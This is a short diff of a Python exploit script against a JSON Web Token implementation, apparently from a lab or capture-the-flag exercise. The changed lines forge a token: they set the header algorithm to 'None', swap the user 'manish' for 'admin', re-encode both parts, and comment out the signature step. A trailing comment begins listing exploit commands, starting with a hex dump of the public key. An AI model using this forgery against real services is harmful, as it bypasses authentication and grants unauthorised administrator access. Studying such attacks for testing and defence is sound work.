@@ -11,14 +11,19 @@ header = base64.b64decode(header)
 payload = base64.b64decode(payload)
 print header, payload
 
-new_header = header.replace('=','')
-new_payload = payload.replace('=','')
+new_header = header.replace('RS256', 'None')
+new_header = base64.b64encode(new_header).replace('=','')
+new_payload = payload.replace('manish','admin')
+new_payload = base64.b64encode(new_payload).replace('=','')
 
 data = new_header+'.'+new_payload
-sig = hmac.new(secret, data, digestmod=hashlib.sha256).digest()
+print data
+'''sig = hmac.new(secret, data, digestmod=hashlib.sha256).digest()
 sign = base64.urlsafe_b64encode(sig).replace('=','')
 
-
+final = data+'.'+sign
+print final
+'''
 '''Commands to run to exploit vulnerability in JWT implementation:
 
 -> cat public.pem | xxd -p | tr -d "\\n"
